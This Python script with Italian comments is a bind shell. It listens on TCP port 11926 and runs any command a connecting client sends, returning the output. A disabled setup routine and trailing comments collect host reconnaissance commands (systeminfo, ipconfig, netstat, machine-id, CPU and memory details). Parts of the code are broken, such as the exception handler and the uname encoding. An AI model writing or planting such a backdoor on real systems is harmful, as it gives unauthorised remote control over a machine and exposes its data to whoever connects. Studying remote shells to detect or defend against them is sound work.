from socket import *
import subprocess
import os
from pathlib import Path
import traceback
import getpass


def connect():
    serverPort = 11926
    serverSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
                                                #socket(...) e' il costruttore della classe socket
    serverSocket.bind( ('',serverPort) ) #collega la socket al port 1200
                                        #la variabile passata e' una t-pla, indicata con la parentesi tonda e NON e' modificabile
    serverSocket.listen(1) #si mette in ascolto, 1 indica la dimensione della coda dei client
    print ('The server is ready to receive')

    connectionSocket, addr = serverSocket.accept()
    print('Accepted a new client', addr)

    return serverSocket, connectionSocket

def setup_windows(connectionSocket):
    connectionSocket.send("systeminfo".encode(encoding='latin-1'))
    connectionSocket.send("ipconfig".encode(encoding='latin-1'))
    connectionSocket.send("getmac".encode(encoding='latin-1'))
    connectionSocket.send("netstat -p TCP".encode(encoding='latin-1'))
    connectionSocket.send("netstat -p UDP".encode(encoding='latin-1'))



def setup_Linux(connectionSocket):
    connectionSocket.send("".encode(encoding='latin-1'))
    connectionSocket.send("".encode(encoding='latin-1'))
    connectionSocket.send("".encode(encoding='latin-1'))
    connectionSocket.send("".encode(encoding='latin-1'))
    connectionSocket.send("".encode(encoding='latin-1'))



def setup(connectionSocket):

    sys = os.uname() #sistema operativo e tipo di macchina
    os.chdir(Path.home()) #cambio directory iniziale (su windows parte da System32, invece così dalla directory
                        #dell'utente che apre il file)

    connectionSocket.send(sys.encode(encoding='latin-1'))
    connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))

    #if sys.sysname == "Windows":
  #      setup_windows(connectionSocket)

    #if sys.sysname == 'Linux': #aggiungere Mac
   
   #     setup_Linux(connectionSocket)

    




def main():
    
    serverSocket, connectionSocket = connect()

   # setup(connectionSocket)

    while True:
        try:
            cmd = connectionSocket.recv(1048576).decode(encoding='latin-1')
            
            if cmd == "esc":
                break

            if cmd.startswith("cd") :

                if not((cmd[2:]).isspace() or len(cmd)==2) :
                    os.chdir(cmd[3:])
            
                result = os.getcwd()

            else:

                result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout

                if result == '':
                    result = "comando non valido\n"

        except Exception:
            result = "Errore: " + Exception.with_traceback()

        finally:
            connectionSocket.send(result.encode(encoding='latin-1'))


    serverSocket.close()
    print("\nConnection closed\n")
    

if __name__ == "__main__":
    main()



# cat /etc/machine-id -------- id macchina
# cat /etc/os-release --------- info generali os
# cat /proc/meminfo ------ info memoria
# cat /proc/cpuinfo ----- info dettagliate di ogni core
# lscpu ---- info architettura cpu
# lspci ------- info schede (video, audio...)
# lsusb ------ info dispositivi usb
# TYPE [nome file] ------ mostra a schermo il contenuto di un file